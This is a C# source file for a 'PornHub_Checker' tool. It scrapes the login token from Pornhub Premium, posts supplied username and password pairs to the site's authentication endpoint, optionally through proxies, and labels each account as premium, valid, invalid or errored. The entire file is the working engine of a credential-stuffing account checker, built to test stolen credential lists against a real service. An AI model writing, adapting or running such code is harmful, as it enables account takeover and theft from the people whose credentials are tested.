namespace PornHub_Checker
{
    using System;
    using xNet;

    class Worker // something like an engine
    {
        public static string Start(string login, string password, ProxyType type, string Proxy, bool proxy)
        {
            try
            {
                string resp = ""; //Return answer
                HttpRequest req = new HttpRequest
                {
                    Cookies = new CookieDictionary(),
                    UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaBrowser/20.2.0.1043 Yowser/2.5 Safari/537.36" // User agent
                };

                if (proxy == true) // if proxies uses...
                {
                    var proxyClient = ProxyClient.Parse(type, Proxy);
                    req.Proxy = proxyClient;
                }

                string token = Helper.Pars(req.Get("https://rt.pornhubpremium.com/premium/login").ToString(), "<input type=\"hidden\" name=\"token\" id=\"token\" value=\"", "\""); //parsing token

                string[] strArrays = new string[] { "username=" + login + "&password=" + password + "&token=" + token + "&redirect=&from=pc_premium_login&segment=straight" }; //authorization requests
                string chek = req.Post("https://rt.pornhubpremium.com/front/authenticate", string.Concat(strArrays), "application/x-www-form-urlencoded").ToString(); //authorization
                req.Cookies.Clear();

                if (Helper.Pars(chek, "\"success\":\"", "\"") == "1") //we determine the type of account from the response received
                {
                    if (Helper.Pars(chek, "\"premium_redirect_cookie\":\"", "\"") == "1")
                    {
                        resp = "Prem";
                    }
                    else
                    {
                        resp = "Good";
                    }
                }
                else
                {
                    resp = "Bad";
                }
                req.Dispose();
                return resp;
            }
            catch
            {
                return "Err"; //failed to connect
            }
        }
    }
}
